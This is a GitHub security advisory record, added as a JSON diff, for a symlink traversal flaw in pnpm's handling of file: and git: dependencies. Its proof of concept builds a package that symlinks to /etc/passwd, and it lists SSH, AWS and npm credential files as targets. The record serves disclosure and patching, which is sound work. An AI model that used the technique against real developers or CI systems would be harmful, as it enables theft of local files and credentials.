@@ -1,0 +1,56 @@
+{
+  "Severity": "MODERATE",
+  "UpdatedAt": "2026-01-26T21:02:36Z",
+  "Package": {
+    "Ecosystem": "NPM",
+    "Name": "pnpm"
+  },
+  "Advisory": {
+    "DatabaseId": 334152,
+    "Id": "GSA_kwCzR0hTQS1tNzMzLTV3OGYtNWdnd84ABRlI",
+    "GhsaId": "GHSA-m733-5w8f-5ggw",
+    "References": [
+      {
+        "Url": "https://github.com/pnpm/pnpm/security/advisories/GHSA-m733-5w8f-5ggw"
+      },
+      {
+        "Url": "https://github.com/pnpm/pnpm/commit/b277b45bc35ae77ca72d7634d144bbd58a48b70f"
+      },
+      {
+        "Url": "https://github.com/pnpm/pnpm/releases/tag/v10.28.2"
+      },
+      {
+        "Url": "https://github.com/advisories/GHSA-m733-5w8f-5ggw"
+      }
+    ],
+    "Identifiers": [
+      {
+        "Type": "GHSA",
+        "Value": "GHSA-m733-5w8f-5ggw"
+      },
+      {
+        "Type": "CVE",
+        "Value": "CVE-2026-24056"
+      }
+    ],
+    "Description": "### Summary\nWhen pnpm installs a `file:` (directory) or `git:` dependency, it follows symlinks and reads their target contents without constraining them to the package root. A malicious package containing a symlink to an absolute path (e.g., `/etc/passwd`, `~/.ssh/id_rsa`) causes pnpm to copy that file's contents into `node_modules`, leaking local data.\n\n**Preconditions:** Only affects `file:` and `git:` dependencies. Registry packages (npm) have symlinks stripped during publish and are NOT affected.\n\n### Details\nThe vulnerability exists in `store/cafs/src/addFilesFromDir.ts`. The code uses `fs.statSync()` and `readFileSync()` which follow symlinks by default:\n\n```typescript\nconst absolutePath = path.join(dirname, relativePath)\nconst stat = fs.statSync(absolutePath)  // Follows symlinks!\nconst buffer = fs.readFileSync(absolutePath)  // Reads symlink TARGET\n```\n\nThere is no check that `absolutePath` resolves to a location inside the package directory.\n\n### PoC\n```bash\n# Create malicious package\nmkdir -p /tmp/evil \u0026\u0026 cd /tmp/evil\nln -s /etc/passwd leaked-passwd.txt\necho '{\"name\":\"evil\",\"version\":\"1.0.0\",\"files\":[\"*.txt\"]}' \u003e package.json\n\n# Victim installs\nmkdir /tmp/victim \u0026\u0026 cd /tmp/victim\npnpm init \u0026\u0026 pnpm add file:../evil\n\n# Leaked!\ncat node_modules/evil/leaked-passwd.txt\n```\n\n### Impact\n- Developers installing local/file dependencies\n- CI/CD pipelines installing git dependencies\n- Credential theft via symlinks to `~/.aws/credentials`, `~/.npmrc`, `~/.ssh/id_rsa`\n\n### Suggested Fix\nUse `lstatSync` to detect symlinks and reject those pointing outside the package root in `store/cafs/src/addFilesFromDir.ts`.",
+    "Origin": "UNSPECIFIED",
+    "PublishedAt": "2026-01-26T21:02:33Z",
+    "Severity": "MODERATE",
+    "Summary": "pnpm has symlink traversal in file:/git dependencies",
+    "UpdatedAt": "2026-01-26T21:02:36Z",
+    "WithdrawnAt": "",
+    "CVSS": {
+      "Score": 0,
+      "VectorString": ""
+    }
+  },
+  "Versions": [
+    {
+      "FirstPatchedVersion": {
+        "Identifier": "10.28.2"
+      },
+      "VulnerableVersionRange": "\u003c 10.28.2"
+    }
+  ]
+}
